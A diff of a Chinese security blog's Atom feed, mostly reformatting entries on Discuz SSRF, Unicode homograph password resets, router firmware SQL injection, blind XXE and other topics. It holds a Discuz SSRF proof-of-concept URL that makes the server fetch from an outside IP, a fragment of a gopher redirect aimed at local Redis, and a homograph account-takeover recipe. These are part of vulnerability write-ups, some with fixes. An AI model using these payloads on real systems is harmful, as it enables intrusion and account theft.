@@ -1,25 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title><![CDATA[xd_xd's blog]]></title>
+  <title>xd_xd&#39;s blog</title>
   
   <link href="/atom.xml" rel="self"/>
+  
   <link href="http://xdxd.love/"/>
   <updated>2016-10-19T02:49:35.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
-    <name><![CDATA[xd_xd]]></name>
+    <name>xd_xd</name>
     
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title><![CDATA[discuz最新版20160601 SSRF漏洞分析及修复方案]]></title>
+    <title>discuz最新版20160601 SSRF漏洞分析及修复方案</title>
     <link href="http://xdxd.love/2016/10/19/discuz%E6%9C%80%E6%96%B0%E7%89%8820160601-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/10/19/discuz最新版20160601-SSRF漏洞分析/</id>
     <published>2016-10-19T01:39:52.000Z</published>
     <updated>2016-10-19T02:49:35.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://wufeifei.com/ssrf/" target="_blank" rel="external">SSRF到GET SHELL</a><br>wooyun:wooyun-2015-0151179</p>
 <h2 id="漏洞poc">漏洞poc</h2><p>访问：<br>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<a href="http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6" target="_blank" rel="external">http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6</a></p>
 <p>需要带formhash，也可以post方式请求。</p>
@@ -115,20 +117,25 @@ header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="v
 <pre><code>curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 
 </code></pre><p>将协议限制为http/https可以降低这个SSRF的危害。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://wufeifei.com/ssrf/" target="_blank" rel="external">SSRF到GET SHELL</a><br>wooyun:wooyun-2015-015117]]>
+    
+      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://wufeifei.com/ssrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SSRF到GET SHELL&lt;/a&gt;&lt;br&gt;wooyun:wooyun-2015-015117
+    
     </summary>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[对称NAT穿透的一种新方法]]></title>
+    <title>对称NAT穿透的一种新方法</title>
     <link href="http://xdxd.love/2016/10/18/%E5%AF%B9%E7%A7%B0NAT%E7%A9%BF%E9%80%8F%E7%9A%84%E4%B8%80%E7%A7%8D%E6%96%B0%E6%96%B9%E6%B3%95/"/>
     <id>http://xdxd.love/2016/10/18/对称NAT穿透的一种新方法/</id>
     <published>2016-10-18T01:57:26.000Z</published>
     <updated>2016-10-18T03:15:00.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
 <h2 id="参考资料">参考资料</h2><p>整理翻译自<a href="https://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf" target="_blank" rel="external">A New Method for Symmetric NAT Traversal in UDP and TCP</a><br><a href="http://www.cnblogs.com/my_life/articles/1908552.html" target="_blank" rel="external">NAT的四种类型及类型检测</a></p>
 <h2 id="关键字">关键字</h2><p>NAT穿透，对称NAT，UDP,P2P，状态包预测，TCP，P2P打洞</p>
@@ -165,21 +172,26 @@ header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="v
 <h2 id="新方法的优势">新方法的优势</h2><h2 id="结论">结论</h2><p><img src="/images/nat9.png" alt=""></p>
 <p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="前言">前言</h2><p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
-<h2 id="参考资料">参考资料</h2><p>整理翻译自<a hre]]>
+    
+      &lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。&lt;/p&gt;
+&lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;整理翻译自&lt;a hre
+    
     </summary>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[unicode同形字引起的安全问题]]></title>
+    <title>unicode同形字引起的安全问题</title>
     <link href="http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
     <id>http://xdxd.love/2016/10/17/unicode同形字引起的安全问题/</id>
     <published>2016-10-17T00:25:08.000Z</published>
     <updated>2016-10-19T05:42:32.000Z</updated>
+    
     <content type="html"><![CDATA[<h1 id="历史上的安全漏洞">历史上的安全漏洞</h1><h2 id="spotify的漏洞">spotify的漏洞</h2><p><a href="https://labs.spotify.com/2013/06/18/creative-usernames/" target="_blank" rel="external">spotify任意用户密码修改漏洞</a><br>漏洞简介:<br>找一个需要黑掉的账号，比如以bigbird为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录bigbird。就可以成功登录。<br>spotify的漏洞相比于github的漏洞来说是一个真正的高危漏洞，可以修改任意用户的密码。</p>
 <h2 id="github的漏洞">github的漏洞</h2><p>相关资料：</p>
 <p><a href="https://twitter.com/GitHubSecurity/status/757686530748125184" target="_blank" rel="external">https://twitter.com/GitHubSecurity/status/757686530748125184</a><br><a href="https://bounty.github.com/researchers/jagracey.html?ljh" target="_blank" rel="external">https://bounty.github.com/researchers/jagracey.html?ljh</a></p>
@@ -208,73 +220,93 @@ header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="v
 <p><img src="/images/unicodesec6.png" alt="image"> </p>
 <p>正常重置了自己的密码。链接中的email字段是base64编码的。解码出来是含有unicode字符的邮箱。所以微信的重置密码业务逻辑中没有标准化unicode字符这个处理。不存在unicode同形字引起的漏洞。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h1 id="历史上的安全漏洞">历史上的安全漏洞</h1><h2 id="spotify的漏洞">spotify的漏洞</h2><p><a href="https://labs.spotify.com/2013/06/18/creative-usernames/" targe]]>
+    
+      &lt;h1 id=&quot;历史上的安全漏洞&quot;&gt;历史上的安全漏洞&lt;/h1&gt;&lt;h2 id=&quot;spotify的漏洞&quot;&gt;spotify的漏洞&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.spotify.com/2013/06/18/creative-usernames/&quot; targe
+    
     </summary>
     
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[一个路由器登录处的溢出分析和利用]]></title>
+    <title>一个路由器登录处的溢出分析和利用</title>
     <link href="http://xdxd.love/2016/10/11/%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E5%BD%95%E5%A4%84%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/"/>
     <id>http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/</id>
     <published>2016-10-11T06:32:51.000Z</published>
     <updated>2016-11-03T05:43:06.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>test</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>test</p>
-]]>
+    
+      &lt;h2 id=&quot;漏洞poc&quot;&gt;漏洞poc&lt;/h2&gt;&lt;p&gt;test&lt;/p&gt;
+
+    
     </summary>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[esp8266芯片相关]]></title>
+    <title>esp8266芯片相关</title>
     <link href="http://xdxd.love/2016/10/09/esp8266%E8%8A%AF%E7%89%87%E7%9B%B8%E5%85%B3/"/>
     <id>http://xdxd.love/2016/10/09/esp8266芯片相关/</id>
     <published>2016-10-09T09:11:15.000Z</published>
     <updated>2016-10-09T09:20:47.000Z</updated>
+    
     <content type="html"><![CDATA[<h1 id="相关工具">相关工具</h1><p><a href="http://espressif.com/en/support/download/other-tools?keys=&amp;field_type_tid%5B%5D=14" target="_blank" rel="external">flash烧写工具</a></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h1 id="相关工具">相关工具</h1><p><a href="http://espressif.com/en/support/download/other-tools?keys=&amp;field_type_tid%5B%5D=14" target="_blank" r]]>
+    
+      &lt;h1 id=&quot;相关工具&quot;&gt;相关工具&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://espressif.com/en/support/download/other-tools?keys=&amp;amp;field_type_tid%5B%5D=14&quot; target=&quot;_blank&quot; r
+    
     </summary>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[台湾游记]]></title>
+    <title>台湾游记</title>
     <link href="http://xdxd.love/2016/10/09/%E5%8F%B0%E6%B9%BE%E6%B8%B8%E8%AE%B0/"/>
     <id>http://xdxd.love/2016/10/09/台湾游记/</id>
     <published>2016-10-09T07:23:23.000Z</published>
     <updated>2016-10-11T01:24:31.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="吐槽">吐槽</h2><p><a href="http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav" target="_blank" rel="external">穷游网台湾精华帖</a>，感觉穷游上的游记更应该像是攻略。这样的游记可以给后来者很多参考，提供很多有用的信息，穷游貌似也主动引导用户这么写。但是完全按照攻略的旅行岂不是成了另外一种形式的跟团游。几年以前放弃跟团，开始自助旅行。这次的经历发现各种攻略越来越成熟，但是攻略的内容只能依赖一半吧。完全按照攻略的旅行，也没有太多新意。</p>
 <h2 id="最佳体验">最佳体验</h2><p>从台东到花莲的绿皮小火车不错。已经没几个人坐了。我们坐的时候整个火车不超过10个人，所以我们自己占了一节车厢。车厢与车厢之间还是露天的。窗户可以打开。一路上很多隧道，很有恐怖电影的感觉。尤其是在隧道前面停车的时候，车刚启动，还没有电，进入隧道就是全黑的。吓死宝宝了。当然，坐这个车是为了看沿途的海景，只要天气好才能看到美丽的海景。</p>
 <p>在垦丁骑个电瓶车，到处晃悠着去看海的感觉也不错。就是天气太好，晒了半天就掉了一层皮。白沙湾可以看到亮瞎眼睛的星星，非常多的星星。</p>
 <p>台湾的鸡排很好吃。自由广场修的不错。故宫空调有点冷。除了美丽的环境，在中正纪念堂也可以感受到从另一个角度看的历史。所以，什么才是真相。</p>
 <h2 id="如果有下次">如果有下次</h2><p>单个地点的深度游也许可以更好。走马观花只能拍拍照，像当地人一样去生活才能感受到更多。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="吐槽">吐槽</h2><p><a href="http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav" target="_blank" rel="external">穷游网台湾精华帖</a>，感觉穷游上的游记更应该像是攻略]]>
+    
+      &lt;h2 id=&quot;吐槽&quot;&gt;吐槽&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;穷游网台湾精华帖&lt;/a&gt;，感觉穷游上的游记更应该像是攻略
+    
     </summary>
     
       <category term="人生苦短" scheme="http://xdxd.love/categories/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD/"/>
     
+    
   </entry>
   
   <entry>
-    <title><![CDATA[小脚本之监控论坛帖子更新并发送邮件通知]]></title>
+    <title>小脚本之监控论坛帖子更新并发送邮件通知</title>
     <link href="http://xdxd.love/2016/09/26/%E5%B0%8F%E8%84%9A%E6%9C%AC%E4%B9%8B%E7%9B%91%E6%8E%A7%E8%AE%BA%E5%9D%9B%E5%B8%96%E5%AD%90%E6%9B%B4%E6%96%B0%E5%B9%B6%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E9%80%9A%E7%9F%A5/"/>
     <id>http://xdxd.love/2016/09/26/小脚本之监控论坛帖子更新并发送邮件通知/</id>
     <published>2016-09-26T06:19:44.000Z</published>
     <updated>2016-10-27T01:25:29.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="需求">需求</h2><p>想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知</p>
 <h2 id="实现">实现</h2><p>用python来实现比较简单，不到100行代码。用requests进行http请求，BeautifulSoup进行html解析。为了加快请求响应速度，设置useragent为手机的useragent，这样子就可以返回手机页面。</p>
 <p>编写一个函数获取第一条帖子的标题。这里的例子为discuz论坛。</p>
@@ -324,23 +356,28 @@ while True:
 </code></pre><p>然后就可以安心干活，不用盯着论坛刷帖了~~</p>
 <h2 id="参考资料">参考资料</h2><p><a href="http://www.cnblogs.com/restran/p/4854623.html" target="_blank" rel="external">Python 进程管理工具 Supervisor 使用教程</a></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="需求">需求</h2><p>想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知</p>
-<h2 id="实现">实现</h2><p>用python来实现比较简单，不到100行代码。用requests进行http请求，BeautifulS]]>
+    
+      &lt;h2 id=&quot;需求&quot;&gt;需求&lt;/h2&gt;&lt;p&gt;想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知&lt;/p&gt;
+&lt;h2 id=&quot;实现&quot;&gt;实现&lt;/h2&gt;&lt;p&gt;用python来实现比较简单，不到100行代码。用requests进行http请求，BeautifulS
+    
     </summary>
     
-      <category term="python" scheme="http://xdxd.love/tags/python/"/>
-    
       <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
+    
+    
+      <category term="python" scheme="http://xdxd.love/tags/python/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[逆向路由器固件之动态调试]]></title>
+    <title>逆向路由器固件之动态调试</title>
     <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
     <id>http://xdxd.love/2016/09/20/逆向路由器固件之动态调试/</id>
     <published>2016-09-20T09:09:52.000Z</published>
     <updated>2016-09-22T06:21:59.000Z</updated>
+    
     <content type="html"><![CDATA[<p>本文根据devttyS0的教程<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">Exploiting Embedded Systems – Part 2</a>和<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/" target="_blank" rel="external">Exploiting Embedded Systems – Part 3</a>复现Trendnet一个路由器的SQL注入漏洞分析过程。部门内容直接翻译引用自原文，可以看做是原文的翻译整理。</p>
 <p>相关的环境搭建<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a>。</p>
 <h2 id="静态分析">静态分析</h2><p>存在漏洞的固件<a href="http://download.trendnet.com/TEW-654TR/firmware/" target="_blank" rel="external">下载地址FW_TEW-654TR_v1.0R(1.10.12).zip</a>,最新版固件<a href="http://www.trendnet.com/support/supportdetail.asp?prod=175_TEW-654TR" target="_blank" rel="external">下载地址</a></p>
@@ -376,22 +413,27 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
 <p>进行长度检查。<br><img src="/images/nixiangmips8.png" alt=""></p>
 <p>检查是否存在单引号避免SQL注入。<br><img src="/images/nixiangmips9.png" alt=""></p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<p>本文根据devttyS0的教程<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">Exploiting Em]]>
+    
+      &lt;p&gt;本文根据devttyS0的教程&lt;a href=&quot;http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Exploiting Em
+    
     </summary>
     
-      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
-    
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[逆向路由器固件之SQL注入]]></title>
+    <title>逆向路由器固件之SQL注入</title>
     <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
     <id>http://xdxd.love/2016/09/20/逆向路由器固件之SQL注入/</id>
     <published>2016-09-20T08:44:34.000Z</published>
     <updated>2016-09-20T08:50:46.000Z</updated>
+    
     <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="http://www.freebuf.com/vuls/76755.html" target="_blank" rel="external">freebuf</a></p>
 <h2 id="另寻他径">另寻他径</h2><p>在前面的内容中，我们使用TEW-654TR路由器的tftp服务实现了获取目标的管理权限。但是要是tftp没有开放到外网怎么办？另寻他径：在这一篇中会我们来分析一个web应用上的漏洞。</p>
 <p>初步分析</p>
@@ -421,40 +463,50 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
 </code></pre><p>上面这个语句可以确保最后查询出来的数据室level最高的用户的数据。</p>
 <p>这次我们终于看到了逆向分析的冰山一角。下一篇将会讨论使用Qemu虚拟机运行路由器固件，动态调试相关的内容。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="]]>
+    
+      &lt;p&gt;翻译自&lt;a href=&quot;http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;devttys0&lt;/a&gt;,发表在&lt;a href=&quot;
+    
     </summary>
     
-      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
-    
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[mips架构缓冲区溢出学习二]]></title>
+    <title>mips架构缓冲区溢出学习二</title>
     <link href="http://xdxd.love/2016/09/18/mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%BA%8C/"/>
     <id>http://xdxd.love/2016/09/18/mips架构缓冲区溢出学习二/</id>
     <published>2016-09-18T01:59:49.000Z</published>
     <updated>2016-09-20T02:56:35.000Z</updated>
+    
     <content type="html"><![CDATA[<p><a href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">mips架构缓冲区溢出学习一</a>中介绍了mips栈溢出的基本原理。这里介绍一下ROP的方式实现命令执行。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<p><a href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA]]>
+    
+      &lt;p&gt;&lt;a href=&quot;http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA
+    
     </summary>
     
-      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
-    
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[w3school上示例代码的安全漏洞]]></title>
+    <title>w3school上示例代码的安全漏洞</title>
     <link href="http://xdxd.love/2016/09/14/w3school%E4%B8%8A%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
     <id>http://xdxd.love/2016/09/14/w3school上示例代码的安全漏洞/</id>
     <published>2016-09-14T05:51:05.000Z</published>
     <updated>2016-09-14T06:59:25.000Z</updated>
+    
     <content type="html"><![CDATA[<p>这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。</p>
 <p>我们用Google搜索<code>php 文件上传</code>或者英文的<code>php file upload</code> </p>
 <p><img src="/images/phpupload2.png" alt=""><br><img src="/images/phpupload1.png" alt=""></p>
@@ -511,23 +563,28 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
 <p><img src="/images/phpupload6.png" alt=""></p>
 <p>所以，当我们用Google搜索php文件上传，给出的第一个示例代码是存在安全漏洞的。编写安全的代码，任重而道远。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<p>这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。</p>
-<p>我们用Google搜索]]>
+    
+      &lt;p&gt;这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。&lt;/p&gt;
+&lt;p&gt;我们用Google搜索
+    
     </summary>
     
-      <category term="php" scheme="http://xdxd.love/tags/php/"/>
-    
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="php" scheme="http://xdxd.love/tags/php/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[一个blind XXE漏洞利用工具XXEinjector]]></title>
+    <title>一个blind XXE漏洞利用工具XXEinjector</title>
     <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AAblind-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/</id>
     <published>2016-09-08T02:22:01.000Z</published>
     <updated>2016-09-09T01:58:19.000Z</updated>
+    
     <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a><br><a href="https://www.92aq.com/2016/01/31/xxeinjector-xxe.html" target="_blank" rel="external">XXEinjector – XXE自动化测试工具</a></p>
 <h2 id="漏洞探测">漏洞探测</h2><p>关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。<br>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
 <p>测试payload:</p>
@@ -547,22 +604,27 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
 <h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet)，根据相应的库的方式禁用外部实体解析。</p>
 <h2 id="备注">备注</h2><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="htt]]>
+    
+      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.t00ls.net/articles-32919.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;关于Blind XXE&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;htt
+    
     </summary>
     
-      <category term="XXE" scheme="http://xdxd.love/tags/XXE/"/>
-    
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="XXE" scheme="http://xdxd.love/tags/XXE/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[安卓分析工具Inspeckage介绍]]></title>
+    <title>安卓分析工具Inspeckage介绍</title>
     <link href="http://xdxd.love/2016/08/09/%E5%AE%89%E5%8D%93%E5%88%86%E6%9E%90%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7Inspeckage%E4%BB%8B%E7%BB%8D/"/>
     <id>http://xdxd.love/2016/08/09/安卓分析辅助工具Inspeckage介绍/</id>
     <published>2016-08-09T07:12:04.000Z</published>
     <updated>2016-08-09T08:00:37.000Z</updated>
+    
     <content type="html"><![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:<a href="http://repo.xposed.info/module/mobi.acpm.inspeckage" target="_blank" rel="external">Inspeckage - Android Package Inspector</a></p>
 <p>Inspeckage的安装就不赘述了，参考xposed框架的安装以及使用。下面主要介绍一下Inspeckage的功能和使用。</p>
 <p>安装之后，可以在桌面上看到inspeckage的图标。点开之后主界面如下：</p>
@@ -588,22 +650,27 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
 <p><img src="/images/inspeckage13.png" alt=""></p>
 <p>在hook的记录中可以看到getPart2的返回值。Inspeckage在动态分析apk的过程可以快速获得一些信息，节省分析的时间。</p>
 ]]></content>
+    
     <summary type="html">
-    <![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:<a href="http://repo.xposed.info/mo]]>
+    
+      &lt;p&gt;Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:&lt;a href=&quot;http://repo.xposed.info/mo
+    
     </summary>
     
-      <category term="inspeckage" scheme="http://xdxd.love/tags/inspeckage/"/>
-    
       <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="inspeckage" scheme="http://xdxd.love/tags/inspeckage/"/>
     
   </entry>
   
   <entry>
-    <title><![CDATA[confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析]]></title>
+    <title>confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析</title>
